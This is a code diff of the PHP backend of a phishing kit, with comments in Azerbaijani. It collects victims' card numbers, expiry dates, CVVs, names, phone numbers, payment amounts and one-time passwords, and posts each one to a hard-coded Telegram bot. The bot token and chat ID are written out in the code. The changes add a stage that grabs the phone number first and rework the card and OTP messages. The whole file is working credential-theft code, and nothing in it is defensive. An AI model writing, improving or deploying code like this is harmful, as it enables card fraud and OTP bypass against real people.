@@ -10,19 +10,20 @@ $botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
 $chatId = '-1004332923672';
 
 // POST MƏLUMATLARI
-$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : 'Məlumat yoxdur';
-$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : 'Məlumat yoxdur';
-$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : 'Məlumat yoxdur';
-$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : 'Məlumat yoxdur';
-$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : 'Məlumat yoxdur';
-$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : 'Məlumat yoxdur';
-$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : 'Məlumat yoxdur';
+$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : '';
+$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : '';
+$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : '';
+$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : '';
+$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : '';
+$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : '';
+$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : '';
 $ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
 $otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
 $campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
+$type = isset($_POST['type']) ? trim(strip_tags($_POST['type'])) : '';
 
 // ============================================
-// 🔢 SIRALI ID - COUNTER FAYLINDAN OXU
+// 🔢 SIRALI ID - COUNTER
 // ============================================
 $counterFile = 'counter.txt';
 if (file_exists($counterFile)) {
@@ -33,18 +34,12 @@ if (file_exists($counterFile)) {
 file_put_contents($counterFile, $id);
 
 // ============================================
-// 📤 TELEGRAM-A GÖNDƏRME FUNKSİYASI
+// 📤 TELEGRAM-A GÖNDƏR
 // ============================================
 function sendToTelegram($message) {
     global $botToken, $chatId;
-    
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $postData = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'HTML'
-    ];
-
+    $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML'];
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_POST, true);
@@ -52,30 +47,51 @@ function sendToTelegram($message) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-
     $response = curl_exec($ch);
     $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
-    
     return $httpCode;
 }
 
-// ============================================
-// 📝 1-Cİ MESAJ: KART MƏLUMATLARI (QISA)
-// ============================================
-if (empty($otp)) {
-    $message1 = "💳 YENİ KART GİRİŞİ #" . $id . "\n";
-    $message1 .= "────────────────────────\n";
-    $message1 .= "📞 Tel: " . $phone . "\n";
-    $message1 .= "💰 Tutar: " . $amount . " AZN\n";
-    $message1 .= "💳 CC: " . $cardNumber . "\n";
-    $message1 .= "📅 Tarix: " . $cardExpiry . "\n";
-    $message1 .= "🔐 CVV: " . $cardCvv . "\n";
-    $message1 .= "👤 İsim: " . $cardName . "\n";
-    $message1 .= "🌐 IP: " . $ip . "\n";
-    $message1 .= "────────────────────────";
+// ============================================================
+// 📝 1-Cİ MESAJ: YALNIZ NÖMRƏ (KARTDAN ƏVVƏL)
+// ============================================================
+if ($type === 'phone_only') {
+    $message = "📞 YENİ NÖMRƏ #" . $id . "\n";
+    $message .= "────────────────────────\n";
+    $message .= "📱 Nömrə: " . $phone . "\n";
+    $message .= "🌐 IP: " . $ip . "\n";
+    $message .= "────────────────────────";
     
-    sendToTelegram($message1);
+    sendToTelegram($message);
+    
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | NÖMRƏ: $phone | IP: $ip\n";
+    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
+    
+    header('Content-Type: application/json');
+    echo json_encode(['status' => 'success']);
+    exit;
+}
+
+// ============================================================
+// 📝 2-Cİ MESAJ: KART + NÖMRƏ (OTP YOXDURSA)
+// ============================================================
+if (empty($otp) && !empty($cardNumber)) {
+    $message = "💳 KART GİRİŞİ #" . $id . "\n";
+    $message .= "────────────────────────\n";
+    $message .= "📱 Nömrə: " . $phone . "\n";
+    $message .= "💰 Tutar: " . $amount . " AZN\n";
+    $message .= "💳 Kart: " . $cardNumber . "\n";
+    $message .= "📅 Tarix: " . $cardExpiry . "\n";
+    $message .= "🔐 CVV: " . $cardCvv . "\n";
+    $message .= "👤 İsim: " . $cardName . "\n";
+    $message .= "🌐 IP: " . $ip . "\n";
+    if (!empty($campaign)) {
+        $message .= "📦 Paket: " . $campaign . "\n";
+    }
+    $message .= "────────────────────────";
+    
+    sendToTelegram($message);
     
     $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | IP: $ip\n";
     file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
@@ -85,21 +101,21 @@ if (empty($otp)) {
     exit;
 }
 
-// ============================================
-// 📝 2-Cİ MESAJ: OTP + PAKET (QISA)
-// ============================================
+// ============================================================
+// 📝 3-CÜ MESAJ: OTP + NÖMRƏ
+// ============================================================
 if (!empty($otp)) {
-    $message2 = "🔑 OTP TƏSDİQİ #" . $id . "\n";
-    $message2 .= "────────────────────────\n";
-    $message2 .= "🔑 OTP: " . $otp . "\n";
-    $message2 .= "🌐 IP: " . $ip . "\n";
+    $message = "🔑 OTP TƏSDİQİ #" . $id . "\n";
+    $message .= "────────────────────────\n";
+    $message .= "📱 Nömrə: " . $phone . "\n";
+    $message .= "🔑 OTP: " . $otp . "\n";
+    $message .= "🌐 IP: " . $ip . "\n";
     if (!empty($campaign)) {
-        $message2 .= "📦 Paket: " . $campaign . "\n";
+        $message .= "📦 Paket: " . $campaign . "\n";
     }
-    $message2 .= "📱 Nömrə: " . $phone . "\n";
-    $message2 .= "────────────────────────";
+    $message .= "────────────────────────";
     
-    sendToTelegram($message2);
+    sendToTelegram($message);
     
     $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | IP: $ip\n";
     file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
